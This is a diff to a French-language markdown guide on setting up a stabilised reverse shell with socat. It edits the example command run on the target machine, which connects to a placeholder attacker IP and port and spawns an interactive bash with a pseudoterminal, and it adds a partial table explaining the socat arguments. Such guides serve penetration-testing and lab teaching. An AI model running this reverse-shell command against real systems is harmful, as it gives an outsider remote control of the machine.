@@ -69,5 +69,11 @@ C'est l'équivalent de faire `stty raw -echo; fg`.
 #### 2- Connection -- Machine cible
 
 ```shell
-socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
+user@raspberrypi: ~$ socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
 ```
+
+| Argument   | But                                                                           |
+| ---------- | ----------------------------------------------------------------------------- |
+| **pty**    | alloue un pseudoterminal sur la cible -- partie du processus de stabilisation |
+| **stderr** | s'assure que tous les messages d'erreur sont affichés dans le shell           |
+|            |                                                                               |
